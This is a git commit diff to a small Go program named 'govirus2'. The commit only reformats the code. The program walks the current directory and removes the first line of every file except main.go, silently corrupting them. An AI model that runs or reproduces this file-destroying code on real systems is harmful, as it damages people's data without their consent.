2dfa993857b337f3bc741d124a849cd1ea25c9e2
Yassa Taiseer <yassataiseer@gmail.com>
2021-06-12 20:12:45 -0400

    -

--- govirus2/main.go
+++ govirus2/main.go
@@ -3,41 +3,38 @@ package main
 import (
     "fmt"
     "io/ioutil"
-    "log"
     "os"
     "strings"
 )
-
-func main() {
-    files, err := ioutil.ReadDir("./")
-    if err != nil {
-        log.Fatal(err)
+func main(){
+    files,err := ioutil.ReadDir("./")
+    if err != nil{
+        panic(err)
     }
- 
-    for _, f := range files {
-            fmt.Println(f.Name())
-            if(f.Name()=="main.go"){
+    for _, f:=range files{
+        fmt.Println(f.Name())
+        if(f.Name()=="main.go"){
 
-            }else{
-                start(f.Name())
-            }
+        }else{
+            start(f.Name())
+        }
     }
 }
 func start(filename string){
     path := filename
-    removeLine(path, 0)
+    removeLine(path,0)
 }
 
-func removeLine(path string, lineNumber int) {
-    file, err := ioutil.ReadFile(path)
-    if err != nil {
+
+func removeLine(path string, lineNumber int){
+    file,err := ioutil.ReadFile(path)
+    if err!=nil{
         panic(err)
     }
-
-    info, _ := os.Stat(path)
+    info,_:= os.Stat(path)
     mode := info.Mode()
-
-    array := strings.Split(string(file), "\n")
-    array = append(array[:lineNumber], array[lineNumber+1:]...)
-    ioutil.WriteFile(path, []byte(strings.Join(array, "\n")), mode)
+    array:= strings.Split(string(file),"\n")
+    array = append(array[:lineNumber],array[lineNumber+1:]...)
+    ioutil.WriteFile(path,[]byte(strings.Join(array,"\n")),mode)
 }
+
